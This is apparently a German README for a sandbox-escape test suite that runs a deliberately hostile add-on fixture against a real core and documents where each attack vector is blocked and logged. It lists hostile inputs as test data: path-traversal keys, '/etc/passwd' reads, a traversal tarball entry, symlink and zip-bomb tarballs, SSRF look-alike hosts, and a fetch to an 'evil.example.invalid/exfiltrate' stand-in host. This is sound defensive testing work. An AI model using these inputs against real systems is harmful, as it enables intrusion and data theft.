# Sandbox-Escape- & Sicherheits-Testsuite (E09-T6, 🔴 Wargame W-10)

Diese Suite ist der Nachweis für docs/07 §7 („Add-on-Sandbox-Escape-Tests
(E09-T6) grün") und für die Akzeptanzkriterien von `tasks/E09-addon-system.md`
§ E09-T6.

Sie fährt ein **Angriffs-Add-on** (`addons-examples/evil-fixture/`) systematisch
gegen einen **echten, gebauten Core-Prozess** und weist für **jeden** Vektor
zwei Dinge nach:

* **(a) geblockt** — die beobachtbare Wirkung ist ausgeblieben bzw. der Aufruf
  lieferte die Ablehnung, und
* **(b) geloggt** — es wurde ein `security`-Event mit der passenden `vector`-Id
  aufgezeichnet, abgefragt über `GET /api/v1/security/events`.

> **Kein Vektor wird durch ein Test-Double „geblockt".** Es gibt in dieser Suite
> keinen Mock, keinen Stub und keine „Schutz-abschaltbar"-Naht im Produktcode.
> Der Core ist der echte, mit `pnpm --filter @yapaja/core build` gebaute
> Prozess; der Browser ist ein echtes Chromium; das Add-on wird über die echte
> zweistufige Install-API installiert.

---

## Ausführen

```sh
pnpm e2e:security            # ganze Suite (baut web+core, startet 1 dedizierten Core)
pnpm security:mutation-proof # Mutations-Nachweis (Akzeptanzkriterium 2, siehe unten)

# Einzelner Vektor:
npx playwright test -c e2e/security/playwright.config.ts -g 'VEKTOR tarball'

# Typecheck der Suite (e2e/ ist kein Workspace-Paket, `pnpm typecheck` deckt es nicht ab):
npx tsc --noEmit -p e2e/security/tsconfig.json
```

Aufbau:

| Datei | Inhalt |
| --- | --- |
| `playwright.config.ts` | Eigene Config: **ein** dedizierter Core (Port 4340), `workers: 1`, `retries: 0`. |
| `support/globalSetup.ts` | Baut web+core und startet den Core (nutzt `apps/web/e2e/support/coreProcess.ts` — dieselbe Mechanik wie die Haupt-Harness, keine zweite Infrastruktur). |
| `support/constants.ts` | Ports, Pfade, Core-Token, Add-on-Ids. |
| `support/helpers.ts` | Evil-Fixture-Tarball bauen, echte Install-API fahren, Security-Log lesen, bösartige Tarballs bauen. |
| `core-vectors.spec.ts` | Alles, was über HTTP/WS gegen den Core geht. |
| `browser-vectors.spec.ts` | Alles, was ein echtes Chromium + das Sandbox-iframe braucht. |

### Warum dieser Core einen API-Token hat

`support/globalSetup.ts` startet den Core mit `API_AUTH_TOKEN`. Das ist für den
Vektor `token.replay_after_disable` **entscheidend**: ohne konfigurierten
Core-Token bleibt die API in ihrer dokumentierten offenen Haltung
(`apps/core/src/auth/authGuard.ts`), und ein wiedervorgelegtes — also von der
Add-on-Schicht nicht mehr erkanntes — Token würde in den anonymen
LAN-Client-Pfad fallen und **durchgelassen**. Erst mit erzwungenem Core-Token
ist „das Replay-Token bringt nichts" ein beobachtbares 401 statt einer Annahme.

---

## Nachweistabelle je Vektor

Legende: *Blockstelle* = wo im Produktivcode die Entscheidung fällt (Zeilen
zum Zeitpunkt dieses Commits). *Event* = die `vector`-Id, die die Suite über
`GET /api/v1/security/events` asserted.

### Core-seitig (`core-vectors.spec.ts`, echter Core über HTTP/WS)

| # | Vektor-Id | Was versucht wird | Blockstelle (file:line) | Wie der Block bewiesen wird | Assertiertes `security`-Event |
|---|---|---|---|---|---|
| 1 | `core.scope_denied` | Add-on-Token liest `GET /api/v1/settings`, liest **und** schreibt `/api/v1/security/events`, rotiert `POST /api/v1/auth/token` | `apps/core/src/addons/scopeMatrix.ts:180` (`ROUTE_NOT_ALLOWED`, Default-Deny), angewandt in `apps/core/src/auth/plugin.ts:158` | Alle vier Aufrufe → **403**; der Response-Body enthält nachweislich **keine** Settings-Daten; derselbe Aufruf mit dem **Core**-Token liefert 200 (Positivkontrolle: die Route lebt, nur das Add-on kommt nicht dran) | `core.scope_denied` mit `detail` = `ROUTE_NOT_ALLOWED: GET /api/v1/settings` |
| 2 | `route.activate_without_confirm` | `POST /navigation/start`, `/navigation/destination`, `/navigation/resume` mit Add-on-Token (kein `nav.control` deklariert) | `apps/core/src/addons/scopeMatrix.ts:195` (`SCOPE_MISSING`), Klassifizierung in `apps/core/src/auth/plugin.ts` (`classifyAddonRefusal`) | Alle drei → **403**, und `GET /navigation/state` ist vorher **und** nachher `idle` — die Navigation wurde nachweislich nicht angefasst | `route.activate_without_confirm` |
| 3 | `events.foreign_topic` (REST) | `POST /addons/{id}/events` mit `topic: addon/com.example.victim/started` bzw. `topic: nav/state` | Fremder Namensraum: `apps/core/src/addons/serviceRoutes.ts:102` (via `normalizeAddonEventTopic`). Core-Topic: wird **umgeschrieben** statt abgelehnt (`scopeMatrix.ts#normalizeAddonEventTopic`) | Fremder Namensraum → **403 `TOPIC_NOT_ALLOWED`**. Für `nav/state` hört ein **unabhängiger Core-Token-WS-Client mit `*`** mit: es kommt `addon/{id}/nav/state` an, **nie** `nav/state`, und kein Payload mit `hijacked:true` landet außerhalb des eigenen Namensraums | `events.foreign_topic` (für den fremden Namensraum) |
| 4 | `events.foreign_topic` (WS) | `/ws/v1`-`subscribe` auf `*`, `addon/com.example.victim/*`, `nav/state` | `apps/core/src/bus/ws.ts:156` (`authorizeAddonTopic`) | Genau diese drei Muster werden per `{type:'error'}` abgelehnt und **nie** abonniert; die eigene `addon/{id}/*`-Subscription liefert weiter Events (Positivkontrolle); es trifft nachweislich **null** Nachricht aus einem fremden Namensraum ein | `events.foreign_topic` (fremder Add-on-Namensraum) + `core.scope_denied` (`*`) |
| 5 | `storage.foreign_namespace` | `PUT /addons/com.example.victim/storage/secret`; `PUT` auf eigenen Namensraum mit Keys `../other/secret`, `%2e%2e%2fother%2fsecret`, `/etc/passwd`, `..\other` | Fremde Id: `apps/core/src/addons/scopeMatrix.ts:188` (`FOREIGN_ADDON`, `ownAddonOnly`). Key-Form: `apps/core/src/addons/storageService.ts:85` (`assertValidKey`/`isSafeStorageKey:75`) | Fremde Id → **403**, Traversal-Keys → **400 `INVALID_KEY`**; danach ist der Wert des Opfer-Add-ons byte-identisch `victim-only`; ein normaler Key im eigenen Namensraum funktioniert weiter (Positivkontrolle) | `storage.foreign_namespace` (zweimal: `FOREIGN_ADDON` **und** `storage key`) |
| 6 | `egress.host_not_declared` | Proxy auf `https://evil.example.com/…` (nichts deklariert); Look-alikes `127.0.0.1.evil.example.com`, `user:pw@127.0.0.1:4340`, `file:///etc/passwd`; SSRF `http://127.0.0.1:4340/api/v1/settings` durch ein Add-on, das `net.fetch:127.0.0.1:4340` **deklariert hat** | `apps/core/src/addons/proxy.ts:213` (`HOST_NOT_ALLOWED`, exakter Hostname-Vergleich) und `proxy.ts:202` (`PRIVATE_HOST_NOT_ALLOWED`) | Alle → **400/403** vom Core selbst, **bevor** ein Socket geöffnet wird (der Body ist die Core-Fehlerantwort, keine Upstream-Antwort) | `egress.host_not_declared` für **beide** Add-ons (`HOST_NOT_ALLOWED` und `PRIVATE_HOST_NOT_ALLOWED`) |
| 7 | `fs.outside_datadir` | Der **Service-Prozess** liest `../../db.sqlite` und `/etc/passwd` und schreibt `./escaped.txt` (außerhalb `YAPAJA_DATA_DIR`) | Nodes Permission-Model, gesetzt in `apps/core/src/addons/service-host.ts:399` (`permissionFlags`, `--allow-fs-read/write` nur auf Add-on- und Storage-Dir) | Das Add-on protokolliert sein **eigenes** Ergebnis nach `$YAPAJA_DATA_DIR/evil-probe.json` (über das Dateisystem, **nicht** über die HTTP-Schicht, die es gleichzeitig angreift); die Suite liest die Datei direkt von Platte: alle drei Zugriffe `ok:false` mit `ERR_ACCESS_DENIED` | `fs.outside_datadir` (der Core erkennt die Verweigerung an `ERR_ACCESS_DENIED` auf stderr des Kindprozesses und pinnt die `addon_id` selbst) |
| 8 | `tarball.path_traversal` | Install eines Tarballs mit Eintrag `../../../../etc/yapaja-pwned.txt` bzw. `/etc/yapaja-pwned.txt` — über die **echte** `POST /api/v1/addons/install`-API | `apps/core/src/addons/extract.ts:175` (`PATH_TRAVERSAL`) über `apps/core/src/addons/paths.ts:74` (`resolveEntryPath`) | Schritt 1 (Dry-Run) → **400 `TARBALL_REJECTED`**, es wird nie eine Datei geschrieben; `/etc/yapaja-pwned.txt` existiert nachweislich nicht | `tarball.path_traversal` |
| 9 | `tarball.symlink` | Install eines Tarballs mit Symlink `ui/db.sqlite -> ../../../db.sqlite` bzw. einem Hardlink | `apps/core/src/addons/extract.ts:161` (`SYMLINK`/`HARDLINK`) | → **400 `TARBALL_REJECTED`** | `tarball.symlink` |
| 10 | `tarball.zip_bomb` | Install eines 60-MB-Zip-Bomb-Tarballs (komprimiert < 1 MB) | `apps/core/src/addons/extract.ts:191/222` (`UNCOMPRESSED_SIZE_EXCEEDED`, laufender Byte-Zähler) | → **400 `TARBALL_REJECTED`** mit `uncompressed` in der Meldung; die Suite asserted zusätzlich, dass die **komprimierte** Nutzlast < 1 MB war — nur der Auspack-Zähler kann das gestoppt haben | `tarball.zip_bomb` |
| 11 | `token.replay_after_disable` | Das Add-on wird disabled; **dasselbe** Token wird danach erneut vorgelegt (`GET /position`, `GET /addons/{id}/storage/mine`) | Token tot: `apps/core/src/addons/tokens.ts:229` (Live-`enabled`-Prüfung) + `revoke()`; danach greift der Core-Token-Guard (`apps/core/src/auth/plugin.ts`) | Vorher liefert dasselbe Token noch **kein** 401/403 (Beweis, dass es lebte); nachher **401** — **kein** Durchfallen in den anonymen Pfad; die Add-on-UI 404't sofort | `token.replay_after_disable` |
| — | (Querschnitt) | — | `apps/core/src/security/securityEvents.ts` (`redactDetail`) | Das gesamte Security-Log wird serialisiert und gegen **alle** im Lauf verwendeten Tokens geprüft | — (Negativnachweis: kein Token im Log) |
| — | (Querschnitt) | — | — | Abschlusstest: **jeder** der zehn core-seitigen Pflichtvektoren hat ≥ 1 aufgezeichnetes Event | alle |

### Browser-seitig (`browser-vectors.spec.ts`, echtes Chromium + Sandbox-iframe)

> **Wie der Block bewiesen wird, ohne dem Add-on zu glauben:** das Fixture
> schreibt jedes Ergebnis in sein **eigenes** DOM. Playwright liest das über
> CDP (`frameLocator`) — ein Kanal, den ein echter Angreifer **nicht** hat (der
> hat nur In-Page-JS, und genau das blockt die Sandbox). Der Nachweis hängt
> damit weder an der Bridge noch an einer Selbstmeldung des Add-ons.

| # | Vektor-Id | Was versucht wird | Blockstelle (file:line) | Wie der Block bewiesen wird | Assertiertes `security`-Event |
|---|---|---|---|---|---|
| 12 | `ui.parent_dom_access` | `window.parent.document`, `top.location.href`, `document.cookie`, `localStorage` des Hosts | `apps/web/src/addons/AddonHost.tsx:87` — `sandbox="allow-scripts"` **ohne** `allow-same-origin` ⇒ opake Origin | Der Test setzt vorher **echte** Host-Cookies + `localStorage` (es gibt also etwas zu stehlen); alle vier Ergebnisse im DOM des Frames sind `false`; das `sandbox`-Attribut wird zusätzlich direkt asserted | `ui.parent_dom_access` (Selbstmeldung → Host → `POST /api/v1/security/events`, siehe „Selbstmeldung" unten) |
| 13 | `ui.foreign_host_fetch` | `fetch('http://evil.example.invalid/exfiltrate')` aus dem iframe | Add-on-CSP `connect-src 'none'` in `apps/core/src/addons/ui-host.ts:85` | Zwei unabhängige Nachweise: (1) das Ergebnis im DOM des Frames ist `false`, (2) Playwright zählt **jede** Anfrage der Seite — es ging **null** Request an eine fremde Origin | `ui.foreign_host_fetch` (Selbstmeldung, s. u.) |
| 14 | `bridge.scope_denied` | `map.addLayer` per **rohem** postMessage (Scope `map.layer.write` nicht deklariert) | `apps/web/src/addons/bridge.ts:247` | Aufruf abgelehnt **und** die Karte hat weder Source noch Layer `addon:{id}:evil-layer`; das Widget aus einem *deklarierten* Scope rendert weiter (Positivkontrolle: die Bridge lebt) | `bridge.scope_denied` mit `map.addLayer` im `detail` |
| 15 | `bridge.unknown_method` | `core.executeSql` (erfunden) und `route.activate` (existiert bewusst nicht) | `apps/web/src/addons/bridge.ts:238` | Beide Ergebnisse im DOM des Frames sind `false` | `bridge.unknown_method`, je einmal pro Methode |
| 16 | `route.activate_without_confirm` (UI) | Routen-**Aktivierung** ohne Nutzerklick über die Bridge | Es gibt keine Aktivierungs-Methode; `route.propose` rendert nur ein Banner (`bridge.ts` `case 'route.propose'`) und ist zudem scope-pflichtig | `POST /navigation/destination` und `/navigation/start` werden abgefangen und **null**-mal aufgerufen; es erscheint **kein** Bestätigungs-Banner; der Core meldet weiterhin `status: idle` | (Der Versuch läuft als `bridge.unknown_method` ins Log, Zeile 15) |
| 17 | `events.foreign_topic` (Bridge) | `events.publish` auf `addon/com.example.victim/started` — Scope `events.publish` **ist** deklariert, der Namensraum ist die Grenze | `apps/web/src/addons/bridge.ts:334` (`namespaceTopic`) | Ergebnis im DOM des Frames ist `false` | `events.foreign_topic` mit der Opfer-Id im `detail` |
| 18 | `storage.foreign_namespace` (Bridge) | `storage.set` mit Key `../com.yapaja.track-recorder/index` | Host reicht die **gepinnte** Add-on-Id durch; Key-Form scheitert an `apps/core/src/addons/storageService.ts:85` | Ergebnis im DOM des Frames ist `false`; die Daten des Opfer-Add-ons sind unverändert | `storage.foreign_namespace` |
| 19 | `bridge.source_spoofed` | Ein **zweites, fremdes** iframe schickt eine protokollkorrekte `widgets.update`-Nachricht *und* eine gefälschte `security-violation` an den Host | `apps/web/src/addons/bridge.ts:190` — Source-Pinning `event.source === iframe.contentWindow` | Der Widget-Text bleibt `armed` (die gespoofte Methode lief nie); die gefälschte Selbstmeldung taucht **nicht** im Log auf — ein Add-on kann keinem anderen etwas anhängen | `bridge.source_spoofed` |
| — | (Teardown) | Disable des Add-ons | `apps/core/src/addons/ui-host.ts` (Live-`enabled`-Gate) + `bridge.destroy()` | iframe **und** Widget verschwinden rückstandsfrei | — |

### Selbstmeldung — was sie beweist und was nicht

Die Vektoren 12 und 13 sind die **einzigen**, deren Verstoß der Core prinzipiell
nicht selbst sehen kann: der Browser blockt sie **innerhalb** des iframes
(opake Origin bzw. CSP), und nur der Add-on-Code selbst sieht den Fehler. Das
Fixture meldet sie deshalb freiwillig per `security-violation`-Nachricht an den
Host, der sie über `POST /api/v1/security/events` weiterreicht (Endpunkt ist
**host-trusted-only** und für Add-on-Principals default-denied — Begründung im
Kopf von `apps/core/src/security/routes.ts`, Test in
`apps/core/src/security/routes.test.ts`).

Das ist **Auditierbarkeit, keine Eindämmung**:

* Ein bösartiges Add-on kann einfach **schweigen** — dann gibt es keinen
  Log-Eintrag. Der **Block** hängt davon nicht ab: er ist die opake Origin bzw.
  die CSP, und die Suite beweist ihn oben unabhängig und out-of-band.
* Ein Add-on kann **nicht** einem anderen etwas anhängen: die Bridge pinnt die
  `addonId` auf das iframe, das sie besitzt (Vektor 19 beweist das aktiv), und
  akzeptiert nur die zwei selbst-meldbaren Vektor-Ids — `tarball.symlink` o. ä.
  lassen sich so nicht fabrizieren.

---

## Was NICHT eingedämmt ist (ehrlich benannt)

**Roher Socket-Egress aus einem vom Core gestarteten Node-Service.** Nodes
Permission-Model (`--permission`) beschränkt das **Dateisystem**, nicht das
Netzwerk — das steht so seit E09-T3 im Kopfkommentar von
`apps/core/src/addons/proxy.ts` und in docs/05 §7. Ein Service-Add-on kann
daher am Egress-Proxy vorbei selbst einen Socket öffnen. Die Suite **behauptet
hier nichts**: das Fixture unternimmt den Versuch
(`service/main.mjs`, Sonde `egress_raw_socket`), und die Suite asserted für
diesen einen Fall **keinen** Block. Echte Egress-Eindämmung heißt
`runtime: external` (eigener Container, eigener Netzwerk-Namespace), genau wie
die Architektur es für alles Untrusted/Schwere vorschreibt.

**Der Core-Topic-Rewrite ist kein Refusal.** `events.publish` auf ein
Core-Topic (`nav/state`) wird in `addon/{id}/nav/state` **umgeschrieben** statt
abgelehnt — eine stärkere Garantie als eine Ablehnung, aber eben auch kein
Refusal, also kein `security`-Event. Die Suite weist die Eindämmung dafür
direkt auf dem Bus nach (Zeile 3 der Tabelle) statt ein Event zu erfinden.

---

## Mutations-Nachweis (Akzeptanzkriterium 2)

```sh
pnpm security:mutation-proof     # = bash scripts/security-mutation-proof.sh
```

Das Skript ist ein **ausführbarer** Nachweis, dass die Suite den Wegfall einer
Schutzmaßnahme wirklich erkennt — kein Laufzeit-Flag, keine injizierbare
„Schutz aus"-Naht (das wäre ein Mock; der Punkt ist der **echte**
Produktionscodepfad):

1. **Basislauf** der betroffenen Tests, unverändert — muss **grün** sein.
   Ohne diesen Schritt wäre ein späteres Rot beliebig erklärbar.
2. **Mutation A** — echter Patch auf `apps/web/src/addons/bridge.ts`: die
   Source-Pinning-Bedingung `event.source !== this.iframe.contentWindow` wird
   zu `false`. Danach **muss** `VEKTOR bridge.source_spoofed` rot werden.
3. **Mutation B** — echter Patch auf
   `apps/core/src/addons/scopeMatrix.ts`: `matchAddonRoute` liefert für eine
   unbekannte Route statt `null` eine scope-freie Regel (Default-**Allow**).
   Danach **muss** `VEKTOR core.scope_denied` rot werden.
4. **Wiederherstellung** über eine `trap` (auch bei Ctrl-C/Abbruch), aus einer
   byte-genauen Kopie, plus abschließende Verifikation, dass die Dateien
   identisch zum Ausgangsstand sind und sich ihr `git status` nicht verändert
   hat.

Exit 0 gibt es nur, wenn der Basislauf grün **und** beide mutierten Läufe rot
waren.

---

## Release-Pipeline (Akzeptanzkriterium 3)

`.github/workflows/ci.yml`, Job **`Security Suite (Sandbox-Escape, E09-T6, W-10)`** —
läuft bei jedem Push/PR und ist damit Teil jeder Release-Pipeline. Der Job
führt aus: Typecheck der Suite, `pnpm e2e:security`, und den
Mutations-Nachweis.

---

## Checkliste: jeder neue Scope erweitert die Suite

> Diese Checkliste ist auch in `tasks/README.md` §4 (Abnahme-Checkliste)
> verlinkt — die vom Task genannte Datei `tasks/README-Abnahme` existiert in
> diesem Repo nicht; die Abnahme-Checkliste ist `tasks/README.md` §4.

Bei **jedem** neuen Permission-Scope, jeder neuen Bridge-Methode und jeder
neuen add-on-erreichbaren Route ist Folgendes Pflicht — sonst ist der PR nicht
abnahmefähig:

- [ ] Der Scope steht in `ADDON_PERMISSION_SCOPES` (`packages/shared`) **und**,
      falls er eine Core-Route freischaltet, als expliziter Eintrag in
      `ADDON_ROUTE_RULES` (`apps/core/src/addons/scopeMatrix.ts`). Kein
      Scope kommt ohne Tabellen-Eintrag an eine Route (Default-Deny).
- [ ] Falls es eine Bridge-Methode ist: Eintrag in `METHOD_SCOPES`
      (`packages/addon-sdk/src/protocol.ts`) — der Scope-Matrix-Test
      (`apps/web/src/addons/scopeMatrix.test.ts`) iteriert darüber und schlägt
      sonst fehl.
- [ ] **Das Evil-Fixture versucht den neuen Scope**: in
      `addons-examples/evil-fixture/ui/evil.js` bzw. `service/main.mjs` einen
      Versuch **ohne** deklarierten Scope ergänzen.
- [ ] **Diese Suite bekommt einen Vektor dazu**: ein Test in
      `core-vectors.spec.ts` oder `browser-vectors.spec.ts`, der (a) den Block
      und (b) das `security`-Event asserted.
- [ ] Falls ein neuer Verletzungs-**Typ** entsteht: neue Vektor-Id in
      `SECURITY_VECTORS` (`apps/core/src/security/securityEvents.ts`) und der
      erzeugende Enforcement-Punkt ruft `securityEventLog.record(...)`.
- [ ] **Zeile in der Nachweistabelle oben** ergänzt (Vektor → Blockstelle →
      Beweis → Event).
- [ ] Der Abschlusstest „jeder core-seitige Pflichtvektor hat mindestens ein
      aufgezeichnetes Event" (`core-vectors.spec.ts`) um die neue Id erweitert.
